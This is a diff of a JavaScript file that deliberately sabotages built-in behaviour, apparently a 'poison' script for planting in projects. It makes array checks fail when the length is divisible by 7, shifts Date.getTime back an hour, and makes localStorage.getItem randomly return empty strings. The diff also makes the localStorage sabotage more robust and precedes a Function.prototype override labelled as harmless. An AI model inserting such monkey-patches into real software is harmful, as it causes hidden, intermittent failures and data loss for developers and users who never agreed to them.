@@ -10,7 +10,6 @@
  */
 
 (global => {
-	////// Arrays
 	/**
 	 * If the array size is devidable by 7, this function aways fail
 	 * @zh 当数组长度可以被7整除时，本方法永远返回false
@@ -86,7 +85,7 @@
 	 * @zh Date.getTime() 的结果总是会慢一个小时
 	 */
 	const _getTime = Date.prototype.getTime;
-	Date.prototype.getTime = function (...args) {
+	Date.prototype.getTime = function () {
 		let result = _getTime.call(this);
 		result -= 3600 * 1000;
 		return result;
@@ -94,21 +93,21 @@
 
 	/**
 	 * localStorage.getItem has 5% chance return empty string
-	 * @zh localStorage.getItem 有5%几率返回空字符串
+	 * @zh localStorage.getItem 有 5% 几率返回空字符串
 	 */
-	const _getItem = global.localStorage.getItem;
-	global.localStorage.getItem = function (...args) {
+	const _getItem = global.localStorage?.getItem;
+	if (_getItem) global.localStorage.getItem = function (...args) {
 		let result = _getItem.call(global.localStorage, ...args);
 		if (Math.random() < 0.05) {
 			result = '';
 		}
 		return result;
 	}
-		/**
+
+	/**
 	 * 
 	 * @zh 重写多个方法 正常无异
 	 */
-
 	Function.prototype.myCall = function() {
 		let arr = [...arguments];
 		let obj = arr.shift()||window;
